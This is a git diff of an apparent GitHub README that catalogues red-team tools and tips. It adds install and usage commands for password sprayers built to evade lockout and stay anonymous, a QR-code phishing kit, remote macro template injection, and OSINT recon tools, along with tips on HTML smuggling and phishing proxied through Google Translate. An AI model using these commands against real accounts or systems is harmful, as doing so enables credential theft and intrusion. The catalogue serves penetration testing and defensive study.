@@ -4,7 +4,7 @@
 <img src="https://user-images.githubusercontent.com/100603074/210680426-20a92131-56f9-43ad-be82-f449e3215dda.png" height="300">
 </p>
 
-This github repository contains a collection of **130+** **tools** and **resources** that can be useful for **red teaming activities**. 
+This github repository contains a collection of **150+** **tools** and **resources** that can be useful for **red teaming activities**. 
 
 Some of the tools may be specifically designed for red teaming, while others are more general-purpose and can be adapted for use in a red teaming context.
 
@@ -23,9 +23,11 @@ Some of the tools may be specifically designed for red teaming, while others are
 # Tool List
 
 <details open>
-    <summary><b>Red Team Tips</b> 17 tips</summary>
+    <summary><b>Red Team Tips</b> 19 tips</summary>
     <ul>
         <ul>
+        	<li><b><a href="#improved-html-smuggling-with-mouse-move-eventlistener">Improved HTML smuggling with mouse move eventlistener</a></b><i> @pr0xylife</i></li>
+        	<li><b><a href="#google-translate-for-phishing">Google translate for phishing</a></b><i> @malmoeb</i></li>
             <li><b><a href="#hiding-the-local-admin-account">Hiding the local admin account</a></b><i> @Alh4zr3d</i></li>
             <li><b><a href="#cripple-windows-defender-by-deleting-signatures">Cripple windows defender by deleting signatures</a></b><i> @Alh4zr3d</i></li>
             <li><b><a href="#enable-multiple-rdp-sessions-per-user">Enable multiple RDP sessions per user</a></b><i> @Alh4zr3d</i></li>
@@ -48,9 +50,13 @@ Some of the tools may be specifically designed for red teaming, while others are
 </details>
 
 <details open>
-    <summary><b>Reconnaissance</b> 20 tools</summary>
+    <summary><b>Reconnaissance</b> 24 tools</summary>
     <ul>
         <ul>
+            <li><b><a href="#spiderfoot">spiderfoot</a></b><i> Automated OSINT and attack surface mapping</i></li>
+            <li><b><a href="#reconftw">reconftw</a></b><i> Automated subdomain and vulnerability recon tool</i></li>
+            <li><b><a href="#subzy">subzy</a></b><i> Subdomain takeover vulnerability checker</i></li>
+            <li><b><a href="#smtp-user-enum">smtp-user-enum</a></b><i> SMTP user enumeration</i></li>
             <li><b><a href="#crtsh---httprobe---eyewitness">crt.sh -> httprobe -> EyeWitness</a></b><i> Automated domain screenshotting</i></li>
             <li><b><a href="#jsendpoints">jsendpoints</a></b><i> Extract page DOM links</i></li>
             <li><b><a href="#nuclei">nuclei</a></b><i> Vulnerability scanner</i></li>
@@ -76,9 +82,10 @@ Some of the tools may be specifically designed for red teaming, while others are
 </details>
 
 <details open>
-    <summary><b>Resource Development</b> 11 tools</summary>
+    <summary><b>Resource Development</b> 12 tools</summary>
     <ul>
         <ul>
+            <li><b><a href="#remoteinjector">remoteinjector</a></b><i> Inject remote template link into word document</i></li>
             <li><b><a href="#chimera">Chimera</a></b><i> PowerShell obfuscation</i></li>
             <li><b><a href="#msfvenom">msfvenom</a></b><i> Payload creation</i></li>
             <li><b><a href="#shellter">Shellter</a></b><i> Dynamic shellcode injection tool</i></li>
@@ -95,9 +102,13 @@ Some of the tools may be specifically designed for red teaming, while others are
 </details>
 
 <details open>
-    <summary><b>Initial Access</b> 6 tools</summary>
+    <summary><b>Initial Access</b> 10 tools</summary>
     <ul>
         <ul>
+            <li><b><a href="#credmaster">CredMaster</a></b><i> CredKing password spraying tool</i></li>
+            <li><b><a href="#trevorspray">TREVORspray</a></b><i> Password sprayer with threading</i></li>
+            <li><b><a href="#evilqr">evilqr</a></b><i> QRLJacking phishing PoC</i></li>
+            <li><b><a href="#cupp">CUPP</a></b><i> Common User Passwords Profiler (CUPP)</i></li>
             <li><b><a href="#bash-bunny">Bash Bunny</a></b><i> USB attack tool</i></li>
             <li><b><a href="#evilgophish">EvilGoPhish</a></b><i> Phishing campaign framework</i></li>
             <li><b><a href="#social-engineer-toolkit-set">The Social-Engineer Toolkit</a></b><i> Phishing campaign framework</i></li>
@@ -142,9 +153,10 @@ Some of the tools may be specifically designed for red teaming, while others are
 </details>
 
 <details open>
-    <summary><b>Privilege Escalation</b> 10 tools</summary>
+    <summary><b>Privilege Escalation</b> 11 tools</summary>
     <ul>
         <ul>
+            <li><b><a href="#crassus">Crassus</a></b><i> Windows privilege escalation discovery tool</i></li>
             <li><b><a href="#linpeas">LinPEAS</a></b><i> Linux privilege escalation</i></li>
             <li><b><a href="#winpeas">WinPEAS</a></b><i> Windows privilege escalation</i></li>
             <li><b><a href="#linux-smart-enumeration">linux-smart-enumeration</a></b><i> Linux privilege escalation</i></li>
@@ -287,7 +299,21 @@ Red Team Tips
 
 *Learn from Red Teamers with a collection of Red Teaming Tips. These tips cover a range of tactics, tools, and methodologies to improve your red teaming abilities.*
 
-**Note:** *Nearly all tips are currently from [@Alh4zr3d](https://twitter.com/Alh4zr3d), he posts good Red Team Tips!*
+### [🔙](#tool-list)Improved HTML smuggling with mouse move eventlistener
+
+**Description:** *'Qakbot added an EventListener for mouse movement to the HTML smuggling attachment for anti evasion in sandbox's the zip wont drop.'*
+
+**Credit:** [@pr0xylife](https://x.com/pr0xylife)
+
+**Link:** [Twitter](https://x.com/pr0xylife/status/1598410732516802563)
+
+### [🔙](#tool-list)Google translate for phishing
+
+**Description:** *Successful phishing page credential stealing being proxied via the google translate page view functionality.*
+
+**Credit:** [@malmoeb](https://x.com/malmoeb)
+
+**Link:** [Twitter](https://x.com/malmoeb/status/1671106885590630400)
 
 ### [🔙](#tool-list)Hiding the local admin account
 
@@ -513,12 +539,124 @@ Copy-Item -Path "C:\tmp\" -Destination "\\<ip_running_responder>\c$"
 
 **Description:** *Using the Microsoft Sysinternals tool PsSuspend.exe it's possible to suspend some AV service executables. The Microsoft signed tool can be passed the PID or Name of a running service, it will suspend the process via the NtSuspendProcess Windows API.*
 
-**Related Blog Post:** [Bypassing AV via Process Suspension with PsSuspend.exe](https://apoc.work/2023/03/22/av-bypass-with-process-suspension)
+**Related Blog Post:** [Bypassing AV via Process Suspension with PsSuspend.exe](https://medium.com/@a-poc/process-suspension-with-pssuspend-exe-0cdf5d16a3b7)
 
 **Link:** [Twitter](https://twitter.com/0gtweet/status/1638069413717975046)
 
 Reconnaissance
 ====================
+
+### [🔙](#tool-list)[spiderfoot](https://github.com/smicallef/spiderfoot)
+
+SpiderFoot is an open source intelligence (OSINT) automation tool. It integrates with just about every data source available and utilises a range of methods for data analysis, making that data easy to navigate.
+
+SpiderFoot can be used offensively (e.g. in a red team exercise or penetration test) for reconnaissance of your target or defensively to gather information about what you or your organisation might have exposed over the Internet.
+
+**Install:** 
+
+```bash
+wget https://github.com/smicallef/spiderfoot/archive/v4.0.tar.gz
+tar zxvf v4.0.tar.gz
+cd spiderfoot-4.0
+pip3 install -r requirements.txt
+```
+
+For full installation instructions see [here](https://github.com/smicallef/spiderfoot?tab=readme-ov-file#installing--running).
+
+**Usage:** 
+
+```python
+python3 ./sf.py -l 127.0.0.1:5001
+```
+
+Lots of usage tutorial videos [here](https://asciinema.org/~spiderfoot)
+
+![spiderfoot](https://github.com/user-attachments/assets/1ce26a9e-6fa5-4987-9aea-4943b9c2efec)
+
+*Image used from https://github.com/smicallef/spiderfoot*
+
+### [🔙](#tool-list)[reconftw](https://github.com/six2dez/reconftw)
+
+reconFTW automates the entire process of reconnaissance for you. It outperforms the work of subdomain enumeration along with various vulnerability checks and obtaining maximum information about your target.
+
+**Install:** 
+
+```bash
+git clone https://github.com/six2dez/reconftw.git;cd reconftw/;./install.sh
+```
+
+For full installation instructions see [here](https://github.com/six2dez/reconftw/wiki/0.-Installation-Guide).
+
+**Usage:** 
+
+```bash
+# Single target domain
+./reconftw.sh -d target.com -r
+
+# One target with multiple domains
+./reconftw.sh -m target -l domains.txt -r
+
+# Passive recon
+./reconftw.sh -d target.com -p
+
+# Perform all checks and exploitations
+./reconftw.sh -d target.com -a
+```
+
+For full usage instructions see [here](https://github.com/six2dez/reconftw/wiki/2.-Usage-Guide).
+
+![reconftw](https://github.com/user-attachments/assets/1a5abeb5-776d-4c10-a02c-934e1662d817)
+
+*Image used from https://www.youtube.com/watch?v=TQmDAtkD1Wo*
+
+### [🔙](#tool-list)[subzy](https://github.com/PentestPad/subzy)
+
+Subdomain takeover tool which works based on matching response fingerprints from [can-i-take-over-xyz](https://github.com/EdOverflow/can-i-take-over-xyz/blob/master/README.md).
+
+**Install:** 
+
+```bash
+go install -v github.com/PentestPad/subzy@latest
+```
+
+For full installation instructions see [here](https://github.com/PentestPad/subzy?tab=readme-ov-file#installation).
+
+**Usage:** 
+
+```bash
+# List of subdomains
+./subzy run --targets list.txt
+
+# Single or multiple targets
+./subzy run --target test.google.com
+./subzy run --target test.google.com,https://test.yahoo.com
+```
+
+![subzy](https://github.com/user-attachments/assets/d06bff41-8c0f-4d3d-b42e-1221b9866332)
+
+*Image used from https://www.geeksforgeeks.org/subzy-subdomain-takeover-vulnerability-checker-tool/*
+
+### [🔙](#tool-list)[smtp-user-enum](https://github.com/cytopia/smtp-user-enum)
+
+SMTP user enumeration via VRFY, EXPN and RCPT with clever timeout, retry and reconnect functionality.
+
+**Install:** 
+
+```bash
+pip install smtp-user-enum
+```
+
+**Usage:** 
+
+```bash
+smtp-user-enum [options] -u/-U host port
+smtp-user-enum --help
+smtp-user-enum --version
+```
+
+![smtp-user-enum](https://github.com/user-attachments/assets/2a965690-52f3-412a-90e3-54dd69e0b275)
+
+*Image used from https://www.kali.org/tools/smtp-user-enum/*
 
 ### [🔙](#tool-list)crt.sh -> httprobe -> EyeWitness
 
@@ -668,7 +806,7 @@ cat targets | ./feroxbuster --stdin --silent -s 200 301 302 --redirects -x js | 
 ./feroxbuster -u http://127.1 --insecure --proxy http://127.0.0.1:8080
 ```
 
-Full usage examples can be found [here](https://epi052.github.io/feroxbuster-docs/docs/examples/).
+    Full usage examples can be found [here](https://epi052.github.io/feroxbuster-docs/docs/examples/).
 
 ![image](https://user-images.githubusercontent.com/100603074/216729079-7a80f942-a692-4e91-8ffc-7d91d8d69d21.png)
 
@@ -1067,6 +1205,26 @@ Full usage information can be found [here](https://github.com/sensepost/gowitnes
 Resource Development
 ====================
 
+### [🔙](#tool-list)[remoteInjector](https://github.com/JohnWoodman/remoteinjector)
+
+Injects link to remote word template into word document.
+
+This Python-based utility modifies a .docx file’s settings.xml.rels link to a remote hosted .dotm template containing a VBA macro, executing when the document is opened and macros are enabled.
+
+[Related Blog Post](https://john-woodman.com/research/vba-macro-remote-template-injection/)
+
+**Install:** 
+
+```bash
+git clone https://github.com/JohnWoodman/remoteinjector;cd remoteinjector
+```
+
+**Usage:** 
+
+```bash
+python3 remoteinjector.py -w https://example.com/template.dotm example.docx
+```
+
 ### [🔙](#tool-list)[Chimera](https://github.com/tokyoneon/Chimera)
 
 Chimera is a PowerShell obfuscation script designed to bypass AMSI and antivirus solutions. It digests malicious PS1's known to trigger AV and uses string substitution and variable concatenation to evade common detection signatures.
@@ -1334,6 +1492,134 @@ End Sub
 
 Initial Access
 ====================
+
+### [🔙](#tool-list)[CredMaster](https://github.com/knavesec/CredMaster)
+
+Launch a password spray / brute force attach via Amazon AWS passthrough proxies, shifting the requesting IP address for every authentication attempt. This dynamically creates FireProx APIs for more evasive password sprays.
+
+CredMaster provides a method of running anonymous password sprays against endpoints in a simple, easy to use tool. The FireProx tool provides the rotating request IP, while the base of CredMaster spoofs all other identifying information.
+
+Features:
+- Fully supports all AWS Regions
+- Automatically generates APIs for proxy pass-through
+- Spoofs API tracking numbers, forwarded-for IPs, and other proxy tracking headers
+- Multi-threaded processing
+- Password delay counters & configuration for lockout policy evasion
+- Easily add new plugins
+- Fully anonymous
+
+**Install:** 
+
+```bash
+git clone https://github.com/knavesec/CredMaster;cd CredMaster;pip install -r requirements.txt
+```
+
+For full installation instructions see [here](https://whynotsecurity.com/blog/credmaster/#setup).
+
+**Usage:** 
+
+```bash
+python3 credmaster.py --plugin {pluginname} --access_key {key} --secret_access_key {key} -u userfile -p passwordfile -a useragentfile {otherargs}
+python3 credmaster.py --config config.json
+```
+
+This tool requires AWS API access keys, a walkthrough on how to acquire these keys can be found here: https://bond-o.medium.com/aws-pass-through-proxy-84f1f7fa4b4b
+
+![credmaster](https://github.com/user-attachments/assets/f678cca4-7a53-41e7-9323-51e8efd0e6ba)
+
+*Image used from https://github.com/knavesec/CredMaster/wiki*
+
+### [🔙](#tool-list)[TREVORspray](https://github.com/blacklanternsecurity/TREVORspray)
+
+TREVORspray is a modular password sprayer with threading, SSH proxying, loot modules, and more!
+
+**Install:** 
+
+```bash
+pip install https://github.com/blacklanternsecurity/TREVORspray
+```
+
+**Usage:** 
+
+```bash
+# Recon
+python3 ./trevorspray --recon evilcorp.com
+
+# Enumerate users via OneDrive
+python3 ./trevorspray --recon evilcorp.com -u emails.txt --threads 10
+
+# Spray against discovered
+python3 ./trevorspray -u emails.txt -p 'Welcome123' --url https://login.windows.net/b43asdas-cdde-bse-ac05-2e37deadbeef/oauth2/token
+```
+
+For full usage instructions see [here](https://github.com/blacklanternsecurity/TREVORspray?tab=readme-ov-file#how-to---o365).
+
+![TREVORspray](https://github.com/user-attachments/assets/67c64f6d-527a-4b59-8dd9-b73bc68274f4)
+
+*Image used from https://github.com/blacklanternsecurity/TREVORspray*
+
+### [🔙](#tool-list)[evilqr](https://github.com/kgretzky/evilqr)
+
+Toolkit demonstrating another approach of a QRLJacking attack, allowing to perform remote account takeover, through sign-in QR code phishing.
+
+It consists of a browser extension used by the attacker to extract the sign-in QR code and a server application, which retrieves the sign-in QR codes to display them on the hosted phishing pages.
+
+Demo [video](https://www.youtube.com/watch?v=8pfodWzqMcU)
+
+**Install: (Extension)** 
+
+You can load the extension in Chrome, through `Load unpacked` feature:
+https://developer.chrome.com/docs/extensions/mv3/getstarted/development-basics/#load-unpacked
+
+Once the extension is installed, make sure to pin its icon in Chrome's extension toolbar, so that the icon is always visible.
+
+**Install: (Server)** 
+
+```bash
+git clone https://github.com/kgretzky/evilqr;cd evilqr/server/;build_run.bat
+```
+
+**Usage:** 
+
+1. Run the server by running the built server binary: `./server/build/evilqr-server`
+2. Open any of the supported websites in your Chrome browser, with installed **Evil QR** extension:
+```
+https://discord.com/login
+https://web.telegram.org/k/
+https://whatsapp.com
+https://store.steampowered.com/login/
+https://accounts.binance.com/en/login
+https://www.tiktok.com/login
+```
+3. Make sure the sign-in QR code is visible and click the **Evil QR** extension icon in the toolbar. If the QR code is recognized, the icon should light up with colors.
+4. Open the server's phishing page URL: `http://127.0.0.1:35000` (default)
+
+![evilqr](https://github.com/user-attachments/assets/00ad78c5-1978-4e59-a522-7e8b9c39b1c3)
+
+*Image used from https://breakdev.org/evilqr-phishing/*
+
+### [🔙](#tool-list)[CUPP](https://github.com/Mebus/cupp)
+
+The most common form of authentication is the combination of a username and a password or passphrase. Passwords can sometimes be guessed profiling the user, such as a birthday, nickname, address, name of a pet or relative, or a common word such as God, love, money or password.
+
+That is why CUPP was born.
+
+**Install:** 
+
+```bash
+git clone https://github.com/Mebus/cupp;cd cupp
+```
+
+**Usage:** 
+
+```bash
+# Run in interactive mode
+python3 ./cupp.py -i
+```
+
+![cupp](https://github.com/user-attachments/assets/39ad1c58-de4e-449a-b2d4-a9629d5ab82c)
+
+*Image used from https://github.com/Mebus/cupp*
 
 ### [🔙](#tool-list)[Bash Bunny](https://shop.hak5.org/products/bash-bunny)
 
@@ -2134,6 +2420,37 @@ Full usage information can be found [here](https://github.com/nicocha30/ligolo-n
 
 Privilege Escalation
 ====================
+
+### [🔙](#tool-list)[Crassus](https://github.com/vu-ls/Crassus)
+
+"Accenture made a tool called Spartacus, which finds DLL hijacking opportunities on Windows. Using Spartacus as a starting point, we created Crassus to extend Windows privilege escalation finding capabilities beyond simply looking for missing files. The ACLs used by files and directories of privileged processes can find more than just looking for missing files to achieve the goal." - [Link](https://github.com/vu-ls/Crassus?tab=readme-ov-file#why-crassus)
+
+**Install: (Build)** 
+
+Crassus was developed as a Visual Studio 2019 project. To build Crassus.exe:
+
+1. Open Crassus.sln
+2. Press Ctrl+Shift+B on your keyboard
+
+**Install: (precompiled)** 
+
+If you trust running other people's code without knowing what it does, Crassus.exe is [provided in this repository](https://github.com/vu-ls/Crassus/blob/main/binaries/Crassus.exe).
+
+**Usage:** 
+
+1. In [Process Monitor](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon), select the `Enable Boot Logging` option. 
+2. Reboot.
+3. Once you have logged in and Windows has settled, optionally also run [scheduled tasks that may be configured to run with privileges](https://gist.github.com/wdormann/8afe4edf605627ee4f203861b6cc3a1c).
+4. Run Process Monitor once again.
+5. When prompted, save the boot log.
+6. Reset the default Process Monitor filter using `Ctrl-R`.
+7. Save this log file, e.g., to `boot.PML`. The reason for re-saving the log file is twofold:
+    1. Older versions of Process Monitor do not save boot logs as a single file.
+    2. Boot logs by default will be unfiltered, which may contain extra noise, such as a local-user DLL hijacking in the launching of of Process Monitor itself.
+
+![Crassus](https://github.com/user-attachments/assets/0194b7bf-80ee-44cd-a576-22bc6888de8a)
+
+*Image used from https://github.com/vu-ls/Crassus?tab=readme-ov-file#screenshots*
 
 ### [🔙](#tool-list)[LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
 
